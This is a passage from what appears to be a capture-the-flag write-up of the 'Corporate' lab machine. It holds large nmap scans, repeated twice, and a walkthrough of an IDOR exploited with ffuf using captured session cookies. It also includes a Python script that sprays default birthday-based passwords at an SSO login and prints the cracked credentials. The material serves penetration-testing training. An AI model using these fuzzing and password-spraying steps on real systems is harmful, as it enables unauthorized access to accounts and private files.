|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Jul 2024 16:01:38 GMT
|_    Content-Length: 0
3128/tcp open  http           Proxmox Virtual Environment REST API 3.0
|_http-server-header: pve-api-daemon/3.0
|_http-title: Site doesn't have a title.
8006/tcp open  wpl-analytics?
| fingerprint-strings: 
|   HTTPOptions: 
|     HTTP/1.0 501 method 'OPTIONS' not available
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:01:46 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:01:46 GMT
|   Help: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:03 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:03 GMT
|   Kerberos, TerminalServerCookie: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:04 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:04 GMT
|   LDAPSearchReq, LPDString: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:15 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:15 GMT
|   RTSPRequest: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:01:47 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|_    Expires: Thu, 18 Jul 2024 16:01:47 GMT
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3004-TCP:V=7.94SVN%I=7%D=7/18%Time=66993E3E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,234,"HTTP/1\.0\x20303\x20See\x20Other\r\nCa
SF:che-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transf
SF:orm\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/ex
SF:plore\r\nSet-Cookie:\x20i_like_gitea=b2252d30ef18e987;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=9PXfopEWWIx79q6Ipg_QqYZ
SF:qsls6MTcyMTMxODQ5NzY5MTg3MTE1Ng;\x20Path=/;\x20Expires=Fri,\x2019\x20Ju
SF:l\x202024\x2016:01:37\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite
SF:=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2018\x20Jul\x2
SF:02024\x2016:01:37\x20GMT\r\nContent-Length:\x2035\r\n\r\n<a\x20href=\"/
SF:explore\">See\x20Other</a>\.\n\n")%r(HTTPOptions,1DD,"HTTP/1\.0\x20405\
SF:x20Method\x20Not\x20Allowed\r\nCache-Control:\x20max-age=0,\x20private,
SF:\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=98d
SF:f98072193808a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x
SF:20_csrf=sClOjLhv29whVZLwK0N9iSGvgf06MTcyMTMxODQ5ODA1OTM1NDcyNA;\x20Path
SF:=/;\x20Expires=Fri,\x2019\x20Jul\x202024\x2016:01:38\x20GMT;\x20HttpOnl
SF:y;\x20SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-
SF:Age=0;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r
SF:\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:01:38\x20GMT\r\nContent-Leng
SF:th:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalSe
SF:rverCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8006-TCP:V=7.94SVN%I=7%D=7/18%Time=66993E48%P=x86_64-pc-linux-gnu%r
SF:(HTTPOptions,D7,"HTTP/1\.0\x20501\x20method\x20'OPTIONS'\x20not\x20avai
SF:lable\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\nDate:\x
SF:20Thu,\x2018\x20Jul\x202024\x2016:01:46\x20GMT\r\nPragma:\x20no-cache\r
SF:\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20Jul\x2020
SF:24\x2016:01:46\x20GMT\r\n\r\n")%r(RTSPRequest,C4,"HTTP/1\.0\x20400\x20b
SF:ad\x20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\
SF:nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:01:47\x20GMT\r\nPragma:\x20no
SF:-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20J
SF:ul\x202024\x2016:01:47\x20GMT\r\n\r\n")%r(Help,C4,"HTTP/1\.0\x20400\x20
SF:bad\x20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r
SF:\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:03\x20GMT\r\nPragma:\x20n
SF:o-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20
SF:Jul\x202024\x2016:02:03\x20GMT\r\n\r\n")%r(TerminalServerCookie,C4,"HTT
SF:P/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\nConne
SF:ction:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GM
SF:T\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\
SF:x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GMT\r\n\r\n")%r(Kerberos,C4
SF:,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\n
SF:Connection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\
SF:x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpi
SF:res:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GMT\r\n\r\n")%r(LPDStr
SF:ing,C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age
SF:=0\r\nConnection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:
SF:02:15\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r
SF:\nExpires:\x20Thu,\x2018\x20Jul\x202024\x2016:02:15\x20GMT\r\n\r\n")%r(
SF:LDAPSearchReq,C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\
SF:x20max-age=0\r\nConnection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202
SF:024\x2016:02:15\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-dae
SF:mon/3\.0\r\nExpires:\x20Thu,\x2018\x20Jul\x202024\x2016:02:15\x20GMT\r\
SF:n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Initiating NSE at 18:11
Completed NSE at 18:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 154.36 seconds
           Raw packets sent: 153447 (6.752MB) | Rcvd: 147823 (5.913MB)
```

There is a SSH port in both hosts that we didn't have access before. In port 3004, its running gitea and in port 3128 a Proxmox virtual environment API, so that's why probably there are 2 hosts: 10.9.0.1 probably is for host machine and 10.9.0.4 a proxmox virtual machine. There is also a NFS port in 10.9.0.1 but as rpcbind is in the other host, we can't use it. So there is nothing interesting now.

A thing to notice is that files are downloaded using an id, but it's not vulnerable to IDOR:

![file download not vulnerable to IDOR](/assets/images/Corporate/file-download-not-idor.png)

However, there is a share functionality that I can use to share files with somebody, and looking at the request is also using an ID:

> Note: I will take the email from my profile as saw before

![sharing request](/assets/images/Corporate/sharing-request.png)

but I can't share with myself:

![I can't share with myself](/assets/images/Corporate/i-cant-share-with-myself.png)

However, I can use the XSS of above to have access as another user in another private window (ctrl+mayus+p in firefox) and share with him.

Now I also have access as Candido Hackett (in your case can also be different) and I can share with him a file (I will first upload one named share-this-file.txt to differentiate):

![Shared file](/assets/images/Corporate/shared-normal-file.png)

As a ID for this request is used, I will try for ID 1 and see I have access to another file created by Ward Pfannerstill, which is another user we enumerated before using that python script:

![Sharing file with ID 1](/assets/images/Corporate/sharing-file-with-id-1.png)

![File with ID 1 shared](/assets/images/Corporate/file-with-id-1-shared.png)

So we have confirmed an IDOR vulnerability, I will use ffuf to share all the existing files to Candido Hackett:

```bash
❯ ffuf -w <(seq 1 2000) -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; session.sig=mtDfpaW-l4_4iOtBEWziyOjD83g; CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MCwibmFtZSI6Ikhlcm1pbmEiLCJzdXJuYW1lIjoiTGV1c2Noa2UiLCJlbWFpbCI6Ikhlcm1pbmEuTGV1c2Noa2VAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMTIzMzA2NiwiZXhwIjoxNzIxMzE5NDY2fQ.xPr-CmiK5wepRjKnE3VXFNzmrQ_oIGZFswoQvE9Q8Zg" -d 'fileId=FUZZ&email=candido.hackett%40corporate.htb' -u http://people.corporate.htb/sharing -fc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://people.corporate.htb/sharing
 :: Wordlist         : FUZZ: /proc/self/fd/13
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: session=eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=; session.sig=mtDfpaW-l4_4iOtBEWziyOjD83g; CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MCwibmFtZSI6Ikhlcm1pbmEiLCJzdXJuYW1lIjoiTGV1c2Noa2UiLCJlbWFpbCI6Ikhlcm1pbmEuTGV1c2Noa2VAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMTIzMzA2NiwiZXhwIjoxNzIxMzE5NDY2fQ.xPr-CmiK5wepRjKnE3VXFNzmrQ_oIGZFswoQvE9Q8Zg
 :: Data             : fileId=FUZZ&email=candido.hackett%40corporate.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: all
________________________________________________

:: Progress: [2000/2000] :: Job [1/1] :: 217 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

We have a bunch of files in our dashboard:

![Bunch of files Candido Hackett](/assets/images/Corporate/bunch-of-files-candido-hacket.png)

The interesting file here is 'Welcome to Corporate 2023 Draft.pdf', which has instructions on how the default password is and says that to access the files, we need a VPN pack we have in our dashboard:

![password and vpn instructions](/assets/images/Corporate/default-password-instructions.png)

The default password for each user is CorporateStarterDDMMYYYY where DDMMYYYY is his birthday and we are able to see that birthday in each user url as we saw before. What if some users forgot to change his password? I will modify the script of above to instead of printing each role and user, take its birthday, test for the corresponding password in the login and if it success, print the user with the password:

```python
#!/usr/bin/python3
import requests, pdb, re

employee_url = "http://people.corporate.htb/employee"
login_url = "http://sso.corporate.htb/login"

def main():
    cookies = {'session':'eyJmbGFzaGVzIjp7ImluZm8iOltdLCJlcnJvciI6W10sInN1Y2Nlc3MiOltdfX0=', 'session.sig':'mtDfpaW-l4_4iOtBEWziyOjD83g', 'CorporateSSO':'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MCwibmFtZSI6Ikhlcm1pbmEiLCJzdXJuYW1lIjoiTGV1c2Noa2UiLCJlbWFpbCI6Ikhlcm1pbmEuTGV1c2Noa2VAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMTIzMzA2NiwiZXhwIjoxNzIxMzE5NDY2fQ.xPr-CmiK5wepRjKnE3VXFNzmrQ_oIGZFswoQvE9Q8Zg'}
    
    for id in range(5001, 7001):
        r = requests.get(f"{employee_url}/{id}", cookies=cookies)
        birthday = re.findall('<th scope="row">Birthday</th>\n          <td>(.*?)</td>', r.text)[0]
        email = re.findall('<a href="mailto:(.*?)">.*?</a>', r.text)[0]
        username = email.split("@")[0]
        # Check if the user exists (if not it will return hermina.leuschke because is the one we have logged in) and if exists, test the password
        if username != "hermina.leuschke":
            month, day, year = birthday.split("/")
            if len(month) == 1:
                month = "0" + month
            if len(day) == 1:
                day = "0" + day
            default_password = "CorporateStarter" + day + month + year
            login_data = {'username':username,'password':default_password}
            r = requests.post(login_url, data=login_data)
            if "Invalid" not in r.text:
                print(f"[Username: {username}] [ID: {id}]: {default_password} -> Valid password found!")
        else:
            break        

if __name__ == '__main__':
    main()
```

```bash
❯ python3 enum-users-web.py
[Username: elwin.jones] [ID: 5021]: CorporateStarter04041987 -> Valid password found!
[Username: laurie.casper] [ID: 5041]: CorporateStarter18111959 -> Valid password found!
[Username: nya.little] [ID: 5055]: CorporateStarter21061965 -> Valid password found!
[Username: brody.wiza] [ID: 5068]: CorporateStarter14071992 -> Valid password found!
```

I will test for elwin.jones first because is the one that stands out the most as it belongs to the IT group:

```bash
❯ grep elwin.jones users-with-roles.txt
elwin.jones@corporate.htb: It
❯ grep laurie.casper users-with-roles.txt
laurie.casper@corporate.htb: Consultant
❯ grep nya.little users-with-roles.txt
nya.little@corporate.htb: Consultant
❯ grep brody.wiza users-with-roles.txt
brody.wiza@corporate.htb: Consultant
```

Looking at elwin.jones files, we have another .ovpn, which as we saw in the welcome pdf, gives us access to the internal staff, so I will download it, connect and redo the scan to see if there are more hosts or ports opened than before:

```bash
❯ for i in $(seq 1 255);do timeout 1 bash -c "ping -c 1 10.9.0.$i" &>/dev/null && echo "Host 10.9.0.$i is active";done;wait
Host 10.9.0.1 is active
Host 10.9.0.4 is active
```

```bash
❯ sudo nmap -sSVC -p- --open --min-rate 5000 -v -n -Pn 10.9.0.4 10.9.0.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 18:08 CEST
<..SNIP..>
Nmap scan report for 10.9.0.4
Host is up (0.18s latency).
Not shown: 64511 closed tcp ports (reset), 1022 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2f:b1:d4:7c:ac:3a:2c:b1:ee:ee:6f:7f:df:41:29:c3 (ECDSA)
|_  256 f0:25:8e:11:26:bd:f3:78:65:59:32:c3:55:7e:99:e5 (ED25519)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.9.0.1
Host is up (0.18s latency).
Not shown: 64590 closed tcp ports (reset), 937 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:7c:4a:20:ca:0c:61:3b:4a:b5:67:f6:3c:36:f7:90 (RSA)
|   256 cc:05:3a:28:c0:18:fa:52:c5:f7:b9:28:c9:ce:09:31 (ECDSA)
|_  256 e8:37:e6:93:6d:eb:d7:74:e4:83:e9:54:4d:e6:95:88 (ED25519)
80/tcp   open  http           OpenResty web app server 1.21.4.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Did not follow redirect to http://corporate.htb
|_http-server-header: openresty/1.21.4.3
389/tcp  open  ldap           OpenLDAP 2.2.X - 2.3.X
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Issuer: commonName=ldap.corporate.htb
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T14:37:34
| Not valid after:  2033-04-01T14:37:35
| MD5:   e4af:a65b:b06b:e957:d427:b75e:6bca:94ac
|_SHA-1: 90ba:45cb:1dbb:5c40:4a08:d0dc:15a4:b9ba:f917:7de4
636/tcp  open  ssl/ldap       OpenLDAP 2.2.X - 2.3.X
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ldap.corporate.htb
| Subject Alternative Name: DNS:ldap.corporate.htb
| Issuer: commonName=ldap.corporate.htb
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-04T14:37:34
| Not valid after:  2033-04-01T14:37:35
| MD5:   e4af:a65b:b06b:e957:d427:b75e:6bca:94ac
|_SHA-1: 90ba:45cb:1dbb:5c40:4a08:d0dc:15a4:b9ba:f917:7de4
2049/tcp open  nfs            4 (RPC #100003)
3004/tcp open  csoftragent?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 303 See Other
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Location: /explore
|     Set-Cookie: i_like_gitea=b2252d30ef18e987; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=9PXfopEWWIx79q6Ipg_QqYZqsls6MTcyMTMxODQ5NzY5MTg3MTE1Ng; Path=/; Expires=Fri, 19 Jul 2024 16:01:37 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Jul 2024 16:01:37 GMT
|     Content-Length: 35
|     href="/explore">See Other</a>.
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=98df98072193808a; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=sClOjLhv29whVZLwK0N9iSGvgf06MTcyMTMxODQ5ODA1OTM1NDcyNA; Path=/; Expires=Fri, 19 Jul 2024 16:01:38 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 18 Jul 2024 16:01:38 GMT
|_    Content-Length: 0
3128/tcp open  http           Proxmox Virtual Environment REST API 3.0
|_http-server-header: pve-api-daemon/3.0
|_http-title: Site doesn't have a title.
8006/tcp open  wpl-analytics?
| fingerprint-strings: 
|   HTTPOptions: 
|     HTTP/1.0 501 method 'OPTIONS' not available
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:01:46 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:01:46 GMT
|   Help: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:03 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:03 GMT
|   Kerberos, TerminalServerCookie: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:04 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:04 GMT
|   LDAPSearchReq, LPDString: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:02:15 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|     Expires: Thu, 18 Jul 2024 16:02:15 GMT
|   RTSPRequest: 
|     HTTP/1.0 400 bad request
|     Cache-Control: max-age=0
|     Connection: close
|     Date: Thu, 18 Jul 2024 16:01:47 GMT
|     Pragma: no-cache
|     Server: pve-api-daemon/3.0
|_    Expires: Thu, 18 Jul 2024 16:01:47 GMT
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3004-TCP:V=7.94SVN%I=7%D=7/18%Time=66993E3E%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,234,"HTTP/1\.0\x20303\x20See\x20Other\r\nCa
SF:che-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transf
SF:orm\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLocation:\x20/ex
SF:plore\r\nSet-Cookie:\x20i_like_gitea=b2252d30ef18e987;\x20Path=/;\x20Ht
SF:tpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=9PXfopEWWIx79q6Ipg_QqYZ
SF:qsls6MTcyMTMxODQ5NzY5MTg3MTE1Ng;\x20Path=/;\x20Expires=Fri,\x2019\x20Ju
SF:l\x202024\x2016:01:37\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cooki
SF:e:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSite
SF:=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2018\x20Jul\x2
SF:02024\x2016:01:37\x20GMT\r\nContent-Length:\x2035\r\n\r\n<a\x20href=\"/
SF:explore\">See\x20Other</a>\.\n\n")%r(HTTPOptions,1DD,"HTTP/1\.0\x20405\
SF:x20Method\x20Not\x20Allowed\r\nCache-Control:\x20max-age=0,\x20private,
SF:\x20must-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=98d
SF:f98072193808a;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x
SF:20_csrf=sClOjLhv29whVZLwK0N9iSGvgf06MTcyMTMxODQ5ODA1OTM1NDcyNA;\x20Path
SF:=/;\x20Expires=Fri,\x2019\x20Jul\x202024\x2016:01:38\x20GMT;\x20HttpOnl
SF:y;\x20SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-
SF:Age=0;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r
SF:\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:01:38\x20GMT\r\nContent-Leng
SF:th:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20clo
SF:se\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalSe
SF:rverCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8006-TCP:V=7.94SVN%I=7%D=7/18%Time=66993E48%P=x86_64-pc-linux-gnu%r
SF:(HTTPOptions,D7,"HTTP/1\.0\x20501\x20method\x20'OPTIONS'\x20not\x20avai
SF:lable\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\nDate:\x
SF:20Thu,\x2018\x20Jul\x202024\x2016:01:46\x20GMT\r\nPragma:\x20no-cache\r
SF:\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20Jul\x2020
SF:24\x2016:01:46\x20GMT\r\n\r\n")%r(RTSPRequest,C4,"HTTP/1\.0\x20400\x20b
SF:ad\x20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r\
SF:nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:01:47\x20GMT\r\nPragma:\x20no
SF:-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20J
SF:ul\x202024\x2016:01:47\x20GMT\r\n\r\n")%r(Help,C4,"HTTP/1\.0\x20400\x20
SF:bad\x20request\r\nCache-Control:\x20max-age=0\r\nConnection:\x20close\r
SF:\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:03\x20GMT\r\nPragma:\x20n
SF:o-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\x20Thu,\x2018\x20
SF:Jul\x202024\x2016:02:03\x20GMT\r\n\r\n")%r(TerminalServerCookie,C4,"HTT
SF:P/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\nConne
SF:ction:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GM
SF:T\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpires:\
SF:x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GMT\r\n\r\n")%r(Kerberos,C4
SF:,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age=0\r\n
SF:Connection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\
SF:x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r\nExpi
SF:res:\x20Thu,\x2018\x20Jul\x202024\x2016:02:04\x20GMT\r\n\r\n")%r(LPDStr
SF:ing,C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\x20max-age
SF:=0\r\nConnection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202024\x2016:
SF:02:15\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-daemon/3\.0\r
SF:\nExpires:\x20Thu,\x2018\x20Jul\x202024\x2016:02:15\x20GMT\r\n\r\n")%r(
SF:LDAPSearchReq,C4,"HTTP/1\.0\x20400\x20bad\x20request\r\nCache-Control:\
SF:x20max-age=0\r\nConnection:\x20close\r\nDate:\x20Thu,\x2018\x20Jul\x202
SF:024\x2016:02:15\x20GMT\r\nPragma:\x20no-cache\r\nServer:\x20pve-api-dae
SF:mon/3\.0\r\nExpires:\x20Thu,\x2018\x20Jul\x202024\x2016:02:15\x20GMT\r\
SF:n\r\n");
